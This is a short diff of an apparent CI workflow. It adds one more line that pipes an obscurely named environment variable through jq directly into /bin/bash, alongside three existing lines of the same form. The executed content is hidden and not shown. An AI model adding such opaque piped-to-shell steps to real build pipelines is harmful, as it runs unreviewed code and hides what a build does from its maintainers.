@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$ltv5443" | jq -r .htekk4118 | /bin/bash
           echo $uz4784 | jq -r .basb1203 | /bin/bash
           echo $op2 | jq -r .xv788 | /bin/bash
+          echo $nxi1485 | jq -r .dik5 | /bin/bash
 
       - name: Save archive
         if: always()
